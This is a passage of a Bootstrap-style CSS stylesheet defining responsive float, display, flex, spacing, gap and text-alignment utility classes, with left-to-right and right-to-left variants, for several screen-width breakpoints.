                    padding-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .pe-sm-5 {
                    padding-right: 3rem !important;
                }
                *[dir="rtl"] .pe-sm-5 {
                    padding-left: 3rem !important;
                }
                .pb-sm-0 {
                    padding-bottom: 0 !important;
                }
                .pb-sm-1 {
                    padding-bottom: 0.25rem !important;
                }
                .pb-sm-2 {
                    padding-bottom: 0.5rem !important;
                }
                .pb-sm-3 {
                    padding-bottom: 1rem !important;
                }
                .pb-sm-4 {
                    padding-bottom: 1.5rem !important;
                }
                .pb-sm-5 {
                    padding-bottom: 3rem !important;
                }
                html:not([dir="rtl"]) .ps-sm-0 {
                    padding-left: 0 !important;
                }
                *[dir="rtl"] .ps-sm-0 {
                    padding-right: 0 !important;
                }
                html:not([dir="rtl"]) .ps-sm-1 {
                    padding-left: 0.25rem !important;
                }
                *[dir="rtl"] .ps-sm-1 {
                    padding-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ps-sm-2 {
                    padding-left: 0.5rem !important;
                }
                *[dir="rtl"] .ps-sm-2 {
                    padding-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ps-sm-3 {
                    padding-left: 1rem !important;
                }
                *[dir="rtl"] .ps-sm-3 {
                    padding-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ps-sm-4 {
                    padding-left: 1.5rem !important;
                }
                *[dir="rtl"] .ps-sm-4 {
                    padding-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ps-sm-5 {
                    padding-left: 3rem !important;
                }
                *[dir="rtl"] .ps-sm-5 {
                    padding-right: 3rem !important;
                }
                .gap-sm-0 {
                    gap: 0 !important;
                }
                .gap-sm-1 {
                    gap: 0.25rem !important;
                }
                .gap-sm-2 {
                    gap: 0.5rem !important;
                }
                .gap-sm-3 {
                    gap: 1rem !important;
                }
                .gap-sm-4 {
                    gap: 1.5rem !important;
                }
                .gap-sm-5 {
                    gap: 3rem !important;
                }
                html:not([dir="rtl"]) .text-sm-start {
                    text-align: left !important;
                }
                *[dir="rtl"] .text-sm-start {
                    text-align: right !important;
                }
                html:not([dir="rtl"]) .text-sm-end {
                    text-align: right !important;
                }
                *[dir="rtl"] .text-sm-end {
                    text-align: left !important;
                }
                html:not([dir="rtl"]) .text-sm-center {
                    text-align: center !important;
                }
                *[dir="rtl"] .text-sm-center {
                    text-align: center !important;
                }
            }
            @media (min-width: 768px) {
                html:not([dir="rtl"]) .float-md-start {
                    float: left !important;
                }
                *[dir="rtl"] .float-md-start {
                    float: right !important;
                }
                html:not([dir="rtl"]) .float-md-end {
                    float: right !important;
                }
                *[dir="rtl"] .float-md-end {
                    float: left !important;
                }
                html:not([dir="rtl"]) .float-md-none {
                    float: none !important;
                }
                *[dir="rtl"] .float-md-none {
                    float: none !important;
                }
                .d-md-inline {
                    display: inline !important;
                }
                .d-md-inline-block {
                    display: inline-block !important;
                }
                .d-md-block {
                    display: block !important;
                }
                .d-md-grid {
                    display: grid !important;
                }
                .d-md-table {
                    display: table !important;
                }
                .d-md-table-row {
                    display: table-row !important;
                }
                .d-md-table-cell {
                    display: table-cell !important;
                }
                .d-md-flex {
                    display: flex !important;
                }
                .d-md-inline-flex {
                    display: inline-flex !important;
                }
                .d-md-none {
                    display: none !important;
                }
                .flex-md-fill {
                    flex: 1 1 auto !important;
                }
                .flex-md-row {
                    flex-direction: row !important;
                }
                .flex-md-column {
                    flex-direction: column !important;
                }
                .flex-md-row-reverse {
                    flex-direction: row-reverse !important;
                }
                .flex-md-column-reverse {
                    flex-direction: column-reverse !important;
                }
                .flex-md-grow-0 {
                    flex-grow: 0 !important;
                }
                .flex-md-grow-1 {
                    flex-grow: 1 !important;
                }
                .flex-md-shrink-0 {
                    flex-shrink: 0 !important;
                }
                .flex-md-shrink-1 {
                    flex-shrink: 1 !important;
                }
                .flex-md-wrap {
                    flex-wrap: wrap !important;
                }
                .flex-md-nowrap {
                    flex-wrap: nowrap !important;
                }
                .flex-md-wrap-reverse {
                    flex-wrap: wrap-reverse !important;
                }
                .justify-content-md-start {
                    justify-content: flex-start !important;
                }
                .justify-content-md-end {
                    justify-content: flex-end !important;
                }
                .justify-content-md-center {
                    justify-content: center !important;
                }
                .justify-content-md-between {
                    justify-content: space-between !important;
                }
                .justify-content-md-around {
                    justify-content: space-around !important;
                }
                .justify-content-md-evenly {
                    justify-content: space-evenly !important;
                }
                .align-items-md-start {
                    align-items: flex-start !important;
                }
                .align-items-md-end {
                    align-items: flex-end !important;
                }
                .align-items-md-center {
                    align-items: center !important;
                }
                .align-items-md-baseline {
                    align-items: baseline !important;
                }
                .align-items-md-stretch {
                    align-items: stretch !important;
                }
                .align-content-md-start {
                    align-content: flex-start !important;
                }
                .align-content-md-end {
                    align-content: flex-end !important;
                }
                .align-content-md-center {
                    align-content: center !important;
                }
                .align-content-md-between {
                    align-content: space-between !important;
                }
                .align-content-md-around {
                    align-content: space-around !important;
                }
                .align-content-md-stretch {
                    align-content: stretch !important;
                }
                .align-self-md-auto {
                    align-self: auto !important;
                }
                .align-self-md-start {
                    align-self: flex-start !important;
                }
                .align-self-md-end {
                    align-self: flex-end !important;
                }
                .align-self-md-center {
                    align-self: center !important;
                }
                .align-self-md-baseline {
                    align-self: baseline !important;
                }
                .align-self-md-stretch {
                    align-self: stretch !important;
                }
                .order-md-first {
                    order: -1 !important;
                }
                .order-md-0 {
                    order: 0 !important;
                }
                .order-md-1 {
                    order: 1 !important;
                }
                .order-md-2 {
                    order: 2 !important;
                }
                .order-md-3 {
                    order: 3 !important;
                }
                .order-md-4 {
                    order: 4 !important;
                }
                .order-md-5 {
                    order: 5 !important;
                }
                .order-md-last {
                    order: 6 !important;
                }
                .m-md-0 {
                    margin: 0 !important;
                }
                .m-md-1 {
                    margin: 0.25rem !important;
                }
                .m-md-2 {
                    margin: 0.5rem !important;
                }
                .m-md-3 {
                    margin: 1rem !important;
                }
                .m-md-4 {
                    margin: 1.5rem !important;
                }
                .m-md-5 {
                    margin: 3rem !important;
                }
                .m-md-auto {
                    margin: auto !important;
                }
                .mx-md-0 {
                    margin-right: 0 !important;
                    margin-left: 0 !important;
                }
                .mx-md-1 {
                    margin-right: 0.25rem !important;
                    margin-left: 0.25rem !important;
                }
                .mx-md-2 {
                    margin-right: 0.5rem !important;
                    margin-left: 0.5rem !important;
                }
                .mx-md-3 {
                    margin-right: 1rem !important;
                    margin-left: 1rem !important;
                }
                .mx-md-4 {
                    margin-right: 1.5rem !important;
                    margin-left: 1.5rem !important;
                }
                .mx-md-5 {
                    margin-right: 3rem !important;
                    margin-left: 3rem !important;
                }
                .mx-md-auto {
                    margin-right: auto !important;
                    margin-left: auto !important;
                }
                .my-md-0 {
                    margin-top: 0 !important;
                    margin-bottom: 0 !important;
                }
                .my-md-1 {
                    margin-top: 0.25rem !important;
                    margin-bottom: 0.25rem !important;
                }
                .my-md-2 {
                    margin-top: 0.5rem !important;
                    margin-bottom: 0.5rem !important;
                }
                .my-md-3 {
                    margin-top: 1rem !important;
                    margin-bottom: 1rem !important;
                }
                .my-md-4 {
                    margin-top: 1.5rem !important;
                    margin-bottom: 1.5rem !important;
                }
                .my-md-5 {
                    margin-top: 3rem !important;
                    margin-bottom: 3rem !important;
                }
                .my-md-auto {
                    margin-top: auto !important;
                    margin-bottom: auto !important;
                }
                .mt-md-0 {
                    margin-top: 0 !important;
                }
                .mt-md-1 {
                    margin-top: 0.25rem !important;
                }
                .mt-md-2 {
                    margin-top: 0.5rem !important;
                }
                .mt-md-3 {
                    margin-top: 1rem !important;
                }
                .mt-md-4 {
                    margin-top: 1.5rem !important;
                }
                .mt-md-5 {
                    margin-top: 3rem !important;
                }
                .mt-md-auto {
                    margin-top: auto !important;
                }
                html:not([dir="rtl"]) .me-md-0 {
                    margin-right: 0 !important;
                }
                *[dir="rtl"] .me-md-0 {
                    margin-left: 0 !important;
                }
                html:not([dir="rtl"]) .me-md-1 {
                    margin-right: 0.25rem !important;
                }
                *[dir="rtl"] .me-md-1 {
                    margin-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .me-md-2 {
                    margin-right: 0.5rem !important;
                }
                *[dir="rtl"] .me-md-2 {
                    margin-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .me-md-3 {
                    margin-right: 1rem !important;
                }
                *[dir="rtl"] .me-md-3 {
                    margin-left: 1rem !important;
                }
                html:not([dir="rtl"]) .me-md-4 {
                    margin-right: 1.5rem !important;
                }
                *[dir="rtl"] .me-md-4 {
                    margin-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .me-md-5 {
                    margin-right: 3rem !important;
                }
                *[dir="rtl"] .me-md-5 {
                    margin-left: 3rem !important;
                }
                html:not([dir="rtl"]) .me-md-auto {
                    margin-right: auto !important;
                }
                *[dir="rtl"] .me-md-auto {
                    margin-left: auto !important;
                }
                .mb-md-0 {
                    margin-bottom: 0 !important;
                }
                .mb-md-1 {
                    margin-bottom: 0.25rem !important;
                }
                .mb-md-2 {
                    margin-bottom: 0.5rem !important;
                }
                .mb-md-3 {
                    margin-bottom: 1rem !important;
                }
                .mb-md-4 {
                    margin-bottom: 1.5rem !important;
                }
                .mb-md-5 {
                    margin-bottom: 3rem !important;
                }
                .mb-md-auto {
                    margin-bottom: auto !important;
                }
                html:not([dir="rtl"]) .ms-md-0 {
                    margin-left: 0 !important;
                }
                *[dir="rtl"] .ms-md-0 {
                    margin-right: 0 !important;
                }
                html:not([dir="rtl"]) .ms-md-1 {
                    margin-left: 0.25rem !important;
                }
                *[dir="rtl"] .ms-md-1 {
                    margin-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ms-md-2 {
                    margin-left: 0.5rem !important;
                }
                *[dir="rtl"] .ms-md-2 {
                    margin-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ms-md-3 {
                    margin-left: 1rem !important;
                }
                *[dir="rtl"] .ms-md-3 {
                    margin-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ms-md-4 {
                    margin-left: 1.5rem !important;
                }
                *[dir="rtl"] .ms-md-4 {
                    margin-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ms-md-5 {
                    margin-left: 3rem !important;
                }
                *[dir="rtl"] .ms-md-5 {
                    margin-right: 3rem !important;
                }
                html:not([dir="rtl"]) .ms-md-auto {
                    margin-left: auto !important;
                }
                *[dir="rtl"] .ms-md-auto {
                    margin-right: auto !important;
                }
                .p-md-0 {
                    padding: 0 !important;
                }
                .p-md-1 {
                    padding: 0.25rem !important;
                }
                .p-md-2 {
                    padding: 0.5rem !important;
                }
                .p-md-3 {
                    padding: 1rem !important;
                }
                .p-md-4 {
                    padding: 1.5rem !important;
                }
                .p-md-5 {
                    padding: 3rem !important;
                }
                .px-md-0 {
                    padding-right: 0 !important;
                    padding-left: 0 !important;
                }
                .px-md-1 {
                    padding-right: 0.25rem !important;
                    padding-left: 0.25rem !important;
                }
                .px-md-2 {
                    padding-right: 0.5rem !important;
                    padding-left: 0.5rem !important;
                }
                .px-md-3 {
                    padding-right: 1rem !important;
                    padding-left: 1rem !important;
                }
                .px-md-4 {
                    padding-right: 1.5rem !important;
                    padding-left: 1.5rem !important;
                }
                .px-md-5 {
                    padding-right: 3rem !important;
                    padding-left: 3rem !important;
                }
                .py-md-0 {
                    padding-top: 0 !important;
                    padding-bottom: 0 !important;
                }
                .py-md-1 {
                    padding-top: 0.25rem !important;
                    padding-bottom: 0.25rem !important;
                }
                .py-md-2 {
                    padding-top: 0.5rem !important;
                    padding-bottom: 0.5rem !important;
                }
                .py-md-3 {
                    padding-top: 1rem !important;
                    padding-bottom: 1rem !important;
                }
                .py-md-4 {
                    padding-top: 1.5rem !important;
                    padding-bottom: 1.5rem !important;
                }
                .py-md-5 {
                    padding-top: 3rem !important;
                    padding-bottom: 3rem !important;
                }
                .pt-md-0 {
                    padding-top: 0 !important;
                }
                .pt-md-1 {
                    padding-top: 0.25rem !important;
                }
                .pt-md-2 {
                    padding-top: 0.5rem !important;
                }
                .pt-md-3 {
                    padding-top: 1rem !important;
                }
                .pt-md-4 {
                    padding-top: 1.5rem !important;
                }
                .pt-md-5 {
                    padding-top: 3rem !important;
                }
                html:not([dir="rtl"]) .pe-md-0 {
                    padding-right: 0 !important;
                }
                *[dir="rtl"] .pe-md-0 {
                    padding-left: 0 !important;
                }
                html:not([dir="rtl"]) .pe-md-1 {
                    padding-right: 0.25rem !important;
                }
                *[dir="rtl"] .pe-md-1 {
                    padding-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .pe-md-2 {
                    padding-right: 0.5rem !important;
                }
                *[dir="rtl"] .pe-md-2 {
                    padding-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .pe-md-3 {
                    padding-right: 1rem !important;
                }
                *[dir="rtl"] .pe-md-3 {
                    padding-left: 1rem !important;
                }
                html:not([dir="rtl"]) .pe-md-4 {
                    padding-right: 1.5rem !important;
                }
                *[dir="rtl"] .pe-md-4 {
                    padding-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .pe-md-5 {
                    padding-right: 3rem !important;
                }
                *[dir="rtl"] .pe-md-5 {
                    padding-left: 3rem !important;
                }
                .pb-md-0 {
                    padding-bottom: 0 !important;
                }
                .pb-md-1 {
                    padding-bottom: 0.25rem !important;
                }
                .pb-md-2 {
                    padding-bottom: 0.5rem !important;
                }
                .pb-md-3 {
                    padding-bottom: 1rem !important;
                }
                .pb-md-4 {
                    padding-bottom: 1.5rem !important;
                }
                .pb-md-5 {
                    padding-bottom: 3rem !important;
                }
                html:not([dir="rtl"]) .ps-md-0 {
                    padding-left: 0 !important;
                }
                *[dir="rtl"] .ps-md-0 {
                    padding-right: 0 !important;
                }
                html:not([dir="rtl"]) .ps-md-1 {
                    padding-left: 0.25rem !important;
                }
                *[dir="rtl"] .ps-md-1 {
                    padding-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ps-md-2 {
                    padding-left: 0.5rem !important;
                }
                *[dir="rtl"] .ps-md-2 {
                    padding-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ps-md-3 {
                    padding-left: 1rem !important;
                }
                *[dir="rtl"] .ps-md-3 {
                    padding-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ps-md-4 {
                    padding-left: 1.5rem !important;
                }
                *[dir="rtl"] .ps-md-4 {
                    padding-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ps-md-5 {
                    padding-left: 3rem !important;
                }
                *[dir="rtl"] .ps-md-5 {
                    padding-right: 3rem !important;
                }
                .gap-md-0 {
                    gap: 0 !important;
                }
                .gap-md-1 {
                    gap: 0.25rem !important;
                }
                .gap-md-2 {
                    gap: 0.5rem !important;
                }
                .gap-md-3 {
                    gap: 1rem !important;
                }
                .gap-md-4 {
                    gap: 1.5rem !important;
                }
                .gap-md-5 {
                    gap: 3rem !important;
                }
                html:not([dir="rtl"]) .text-md-start {
                    text-align: left !important;
                }
                *[dir="rtl"] .text-md-start {
                    text-align: right !important;
                }
                html:not([dir="rtl"]) .text-md-end {
                    text-align: right !important;
                }
                *[dir="rtl"] .text-md-end {
                    text-align: left !important;
                }
                html:not([dir="rtl"]) .text-md-center {
                    text-align: center !important;
                }
                *[dir="rtl"] .text-md-center {
                    text-align: center !important;
                }
            }
            @media (min-width: 992px) {
                html:not([dir="rtl"]) .float-lg-start {
                    float: left !important;
                }
                *[dir="rtl"] .float-lg-start {
                    float: right !important;
                }
                html:not([dir="rtl"]) .float-lg-end {
                    float: right !important;
                }
                *[dir="rtl"] .float-lg-end {
                    float: left !important;
                }
                html:not([dir="rtl"]) .float-lg-none {
                    float: none !important;
                }
                *[dir="rtl"] .float-lg-none {
                    float: none !important;
                }
                .d-lg-inline {
                    display: inline !important;
                }
                .d-lg-inline-block {
                    display: inline-block !important;
                }
                .d-lg-block {
                    display: block !important;
                }
                .d-lg-grid {
                    display: grid !important;
                }
                .d-lg-table {
                    display: table !important;
                }
                .d-lg-table-row {
                    display: table-row !important;
                }
                .d-lg-table-cell {
                    display: table-cell !important;
                }
                .d-lg-flex {
                    display: flex !important;
                }
                .d-lg-inline-flex {
                    display: inline-flex !important;
                }
                .d-lg-none {
                    display: none !important;
                }
                .flex-lg-fill {
                    flex: 1 1 auto !important;
                }
                .flex-lg-row {
                    flex-direction: row !important;
                }
                .flex-lg-column {
                    flex-direction: column !important;
                }
                .flex-lg-row-reverse {
                    flex-direction: row-reverse !important;
                }
                .flex-lg-column-reverse {
                    flex-direction: column-reverse !important;
                }
                .flex-lg-grow-0 {
                    flex-grow: 0 !important;
                }
                .flex-lg-grow-1 {
                    flex-grow: 1 !important;
                }
                .flex-lg-shrink-0 {
                    flex-shrink: 0 !important;
                }
                .flex-lg-shrink-1 {
                    flex-shrink: 1 !important;
                }
                .flex-lg-wrap {
                    flex-wrap: wrap !important;
                }
                .flex-lg-nowrap {
                    flex-wrap: nowrap !important;
                }
                .flex-lg-wrap-reverse {
                    flex-wrap: wrap-reverse !important;
                }
                .justify-content-lg-start {
                    justify-content: flex-start !important;
                }
                .justify-content-lg-end {
                    justify-content: flex-end !important;
                }
                .justify-content-lg-center {
                    justify-content: center !important;
                }
                .justify-content-lg-between {
                    justify-content: space-between !important;
                }
                .justify-content-lg-around {
                    justify-content: space-around !important;
                }
                .justify-content-lg-evenly {
                    justify-content: space-evenly !important;
                }
                .align-items-lg-start {
                    align-items: flex-start !important;
                }
                .align-items-lg-end {
                    align-items: flex-end !important;
                }
                .align-items-lg-center {
                    align-items: center !important;
                }
                .align-items-lg-baseline {
                    align-items: baseline !important;
                }
                .align-items-lg-stretch {
                    align-items: stretch !important;
                }
                .align-content-lg-start {
                    align-content: flex-start !important;
                }
                .align-content-lg-end {
                    align-content: flex-end !important;
                }
                .align-content-lg-center {
                    align-content: center !important;
                }
                .align-content-lg-between {
                    align-content: space-between !important;
                }
                .align-content-lg-around {
                    align-content: space-around !important;
                }
                .align-content-lg-stretch {
                    align-content: stretch !important;
                }
                .align-self-lg-auto {
                    align-self: auto !important;
                }
                .align-self-lg-start {
                    align-self: flex-start !important;
                }
                .align-self-lg-end {
                    align-self: flex-end !important;
                }
                .align-self-lg-center {
                    align-self: center !important;
                }
                .align-self-lg-baseline {
                    align-self: baseline !important;
                }
                .align-self-lg-stretch {
                    align-self: stretch !important;
                }
                .order-lg-first {
                    order: -1 !important;
                }
                .order-lg-0 {
                    order: 0 !important;
                }
                .order-lg-1 {
                    order: 1 !important;
                }
                .order-lg-2 {
                    order: 2 !important;
                }
                .order-lg-3 {
                    order: 3 !important;
                }
                .order-lg-4 {
                    order: 4 !important;
                }
                .order-lg-5 {
                    order: 5 !important;
                }
                .order-lg-last {
                    order: 6 !important;
                }
                .m-lg-0 {
                    margin: 0 !important;
                }
                .m-lg-1 {
                    margin: 0.25rem !important;
                }
                .m-lg-2 {
                    margin: 0.5rem !important;
                }
                .m-lg-3 {
                    margin: 1rem !important;
                }
                .m-lg-4 {
                    margin: 1.5rem !important;
                }
                .m-lg-5 {
                    margin: 3rem !important;
                }
                .m-lg-auto {
                    margin: auto !important;
                }
                .mx-lg-0 {
                    margin-right: 0 !important;
                    margin-left: 0 !important;
                }
                .mx-lg-1 {
                    margin-right: 0.25rem !important;
                    margin-left: 0.25rem !important;
                }
                .mx-lg-2 {
                    margin-right: 0.5rem !important;
                    margin-left: 0.5rem !important;
                }
                .mx-lg-3 {
                    margin-right: 1rem !important;
                    margin-left: 1rem !important;
                }
                .mx-lg-4 {
                    margin-right: 1.5rem !important;
                    margin-left: 1.5rem !important;
                }
                .mx-lg-5 {
                    margin-right: 3rem !important;
                    margin-left: 3rem !important;
                }
                .mx-lg-auto {
                    margin-right: auto !important;
                    margin-left: auto !important;
                }
                .my-lg-0 {
                    margin-top: 0 !important;
                    margin-bottom: 0 !important;
                }
                .my-lg-1 {
                    margin-top: 0.25rem !important;
                    margin-bottom: 0.25rem !important;
                }
                .my-lg-2 {
                    margin-top: 0.5rem !important;
                    margin-bottom: 0.5rem !important;
                }
                .my-lg-3 {
                    margin-top: 1rem !important;
                    margin-bottom: 1rem !important;
                }
                .my-lg-4 {
                    margin-top: 1.5rem !important;
                    margin-bottom: 1.5rem !important;
                }
                .my-lg-5 {
                    margin-top: 3rem !important;
                    margin-bottom: 3rem !important;
                }
                .my-lg-auto {
                    margin-top: auto !important;
                    margin-bottom: auto !important;
                }
                .mt-lg-0 {
                    margin-top: 0 !important;
                }
                .mt-lg-1 {
                    margin-top: 0.25rem !important;
                }
                .mt-lg-2 {
                    margin-top: 0.5rem !important;
                }
                .mt-lg-3 {
                    margin-top: 1rem !important;
                }
                .mt-lg-4 {
                    margin-top: 1.5rem !important;
                }
                .mt-lg-5 {
                    margin-top: 3rem !important;
                }
                .mt-lg-auto {
                    margin-top: auto !important;
                }
                html:not([dir="rtl"]) .me-lg-0 {
                    margin-right: 0 !important;
                }
                *[dir="rtl"] .me-lg-0 {
                    margin-left: 0 !important;
                }
                html:not([dir="rtl"]) .me-lg-1 {
                    margin-right: 0.25rem !important;
                }
                *[dir="rtl"] .me-lg-1 {
                    margin-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .me-lg-2 {
                    margin-right: 0.5rem !important;
                }
                *[dir="rtl"] .me-lg-2 {
                    margin-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .me-lg-3 {
                    margin-right: 1rem !important;
                }
                *[dir="rtl"] .me-lg-3 {
                    margin-left: 1rem !important;
                }
                html:not([dir="rtl"]) .me-lg-4 {
                    margin-right: 1.5rem !important;
                }
                *[dir="rtl"] .me-lg-4 {
                    margin-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .me-lg-5 {
                    margin-right: 3rem !important;
                }
                *[dir="rtl"] .me-lg-5 {
                    margin-left: 3rem !important;
                }
                html:not([dir="rtl"]) .me-lg-auto {
                    margin-right: auto !important;
                }
                *[dir="rtl"] .me-lg-auto {
                    margin-left: auto !important;
                }
                .mb-lg-0 {
                    margin-bottom: 0 !important;
                }
                .mb-lg-1 {
                    margin-bottom: 0.25rem !important;
                }
                .mb-lg-2 {
                    margin-bottom: 0.5rem !important;
                }
                .mb-lg-3 {
                    margin-bottom: 1rem !important;
                }
                .mb-lg-4 {
                    margin-bottom: 1.5rem !important;
                }
                .mb-lg-5 {
                    margin-bottom: 3rem !important;
                }
                .mb-lg-auto {
                    margin-bottom: auto !important;
                }
                html:not([dir="rtl"]) .ms-lg-0 {
                    margin-left: 0 !important;
                }
                *[dir="rtl"] .ms-lg-0 {
                    margin-right: 0 !important;
                }
                html:not([dir="rtl"]) .ms-lg-1 {
                    margin-left: 0.25rem !important;
                }
                *[dir="rtl"] .ms-lg-1 {
                    margin-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ms-lg-2 {
                    margin-left: 0.5rem !important;
                }
                *[dir="rtl"] .ms-lg-2 {
                    margin-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ms-lg-3 {
                    margin-left: 1rem !important;
                }
                *[dir="rtl"] .ms-lg-3 {
                    margin-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ms-lg-4 {
                    margin-left: 1.5rem !important;
                }
                *[dir="rtl"] .ms-lg-4 {
                    margin-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ms-lg-5 {
                    margin-left: 3rem !important;
                }
                *[dir="rtl"] .ms-lg-5 {
                    margin-right: 3rem !important;
                }
                html:not([dir="rtl"]) .ms-lg-auto {
                    margin-left: auto !important;
                }
                *[dir="rtl"] .ms-lg-auto {
                    margin-right: auto !important;
                }
                .p-lg-0 {
                    padding: 0 !important;
                }
                .p-lg-1 {
                    padding: 0.25rem !important;
                }
                .p-lg-2 {
                    padding: 0.5rem !important;
                }
                .p-lg-3 {
                    padding: 1rem !important;
                }
                .p-lg-4 {
                    padding: 1.5rem !important;
                }
                .p-lg-5 {
                    padding: 3rem !important;
                }
                .px-lg-0 {
                    padding-right: 0 !important;
                    padding-left: 0 !important;
                }
                .px-lg-1 {
                    padding-right: 0.25rem !important;
                    padding-left: 0.25rem !important;
                }
                .px-lg-2 {
                    padding-right: 0.5rem !important;
                    padding-left: 0.5rem !important;
                }
                .px-lg-3 {
                    padding-right: 1rem !important;
                    padding-left: 1rem !important;
                }
                .px-lg-4 {
                    padding-right: 1.5rem !important;
                    padding-left: 1.5rem !important;
                }
                .px-lg-5 {
                    padding-right: 3rem !important;
                    padding-left: 3rem !important;
                }
                .py-lg-0 {
                    padding-top: 0 !important;
                    padding-bottom: 0 !important;
                }
                .py-lg-1 {
                    padding-top: 0.25rem !important;
                    padding-bottom: 0.25rem !important;
                }
                .py-lg-2 {
                    padding-top: 0.5rem !important;
                    padding-bottom: 0.5rem !important;
                }
                .py-lg-3 {
                    padding-top: 1rem !important;
                    padding-bottom: 1rem !important;
                }
                .py-lg-4 {
                    padding-top: 1.5rem !important;
                    padding-bottom: 1.5rem !important;
                }
                .py-lg-5 {
                    padding-top: 3rem !important;
                    padding-bottom: 3rem !important;
                }
                .pt-lg-0 {
                    padding-top: 0 !important;
                }
                .pt-lg-1 {
                    padding-top: 0.25rem !important;
                }
                .pt-lg-2 {
                    padding-top: 0.5rem !important;
                }
                .pt-lg-3 {
                    padding-top: 1rem !important;
                }
                .pt-lg-4 {
                    padding-top: 1.5rem !important;
                }
                .pt-lg-5 {
                    padding-top: 3rem !important;
                }
                html:not([dir="rtl"]) .pe-lg-0 {
                    padding-right: 0 !important;
                }
                *[dir="rtl"] .pe-lg-0 {
                    padding-left: 0 !important;
                }
                html:not([dir="rtl"]) .pe-lg-1 {
                    padding-right: 0.25rem !important;
                }
                *[dir="rtl"] .pe-lg-1 {
                    padding-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .pe-lg-2 {
                    padding-right: 0.5rem !important;
                }
                *[dir="rtl"] .pe-lg-2 {
                    padding-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .pe-lg-3 {
                    padding-right: 1rem !important;
                }
                *[dir="rtl"] .pe-lg-3 {
                    padding-left: 1rem !important;
                }
                html:not([dir="rtl"]) .pe-lg-4 {
                    padding-right: 1.5rem !important;
                }
                *[dir="rtl"] .pe-lg-4 {
                    padding-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .pe-lg-5 {
                    padding-right: 3rem !important;
                }
                *[dir="rtl"] .pe-lg-5 {
                    padding-left: 3rem !important;
                }
                .pb-lg-0 {
                    padding-bottom: 0 !important;
                }
                .pb-lg-1 {
                    padding-bottom: 0.25rem !important;
                }
                .pb-lg-2 {
                    padding-bottom: 0.5rem !important;
                }
                .pb-lg-3 {
                    padding-bottom: 1rem !important;
                }
                .pb-lg-4 {
                    padding-bottom: 1.5rem !important;
                }
                .pb-lg-5 {
                    padding-bottom: 3rem !important;
                }
                html:not([dir="rtl"]) .ps-lg-0 {
                    padding-left: 0 !important;
                }
                *[dir="rtl"] .ps-lg-0 {
                    padding-right: 0 !important;
                }
                html:not([dir="rtl"]) .ps-lg-1 {
                    padding-left: 0.25rem !important;
                }
                *[dir="rtl"] .ps-lg-1 {
                    padding-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ps-lg-2 {
                    padding-left: 0.5rem !important;
                }
                *[dir="rtl"] .ps-lg-2 {
                    padding-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ps-lg-3 {
                    padding-left: 1rem !important;
                }
                *[dir="rtl"] .ps-lg-3 {
                    padding-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ps-lg-4 {
                    padding-left: 1.5rem !important;
                }
                *[dir="rtl"] .ps-lg-4 {
                    padding-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ps-lg-5 {
                    padding-left: 3rem !important;
                }
                *[dir="rtl"] .ps-lg-5 {
                    padding-right: 3rem !important;
                }
                .gap-lg-0 {
                    gap: 0 !important;
                }
                .gap-lg-1 {
                    gap: 0.25rem !important;
                }
                .gap-lg-2 {
                    gap: 0.5rem !important;
                }
                .gap-lg-3 {
                    gap: 1rem !important;
                }
                .gap-lg-4 {
                    gap: 1.5rem !important;
                }
                .gap-lg-5 {
                    gap: 3rem !important;
                }
                html:not([dir="rtl"]) .text-lg-start {
                    text-align: left !important;
                }
                *[dir="rtl"] .text-lg-start {
                    text-align: right !important;
                }
                html:not([dir="rtl"]) .text-lg-end {
                    text-align: right !important;
                }
                *[dir="rtl"] .text-lg-end {
                    text-align: left !important;
                }
                html:not([dir="rtl"]) .text-lg-center {
                    text-align: center !important;
                }
                *[dir="rtl"] .text-lg-center {
                    text-align: center !important;
                }
            }
            @media (min-width: 1200px) {
                html:not([dir="rtl"]) .float-xl-start {
                    float: left !important;
                }
                *[dir="rtl"] .float-xl-start {
                    float: right !important;
                }
                html:not([dir="rtl"]) .float-xl-end {
                    float: right !important;
                }
                *[dir="rtl"] .float-xl-end {
                    float: left !important;
                }
                html:not([dir="rtl"]) .float-xl-none {
                    float: none !important;
                }
                *[dir="rtl"] .float-xl-none {
                    float: none !important;
                }
                .d-xl-inline {
                    display: inline !important;
                }
                .d-xl-inline-block {
                    display: inline-block !important;
                }
                .d-xl-block {
                    display: block !important;
                }
                .d-xl-grid {
                    display: grid !important;
                }
                .d-xl-table {
                    display: table !important;
                }
                .d-xl-table-row {
                    display: table-row !important;
                }
                .d-xl-table-cell {
                    display: table-cell !important;
                }
                .d-xl-flex {
                    display: flex !important;
                }
                .d-xl-inline-flex {
                    display: inline-flex !important;
                }
                .d-xl-none {
                    display: none !important;
                }
                .flex-xl-fill {
                    flex: 1 1 auto !important;
                }
                .flex-xl-row {
                    flex-direction: row !important;
                }
                .flex-xl-column {
                    flex-direction: column !important;
                }
                .flex-xl-row-reverse {
                    flex-direction: row-reverse !important;
                }
                .flex-xl-column-reverse {
                    flex-direction: column-reverse !important;
                }
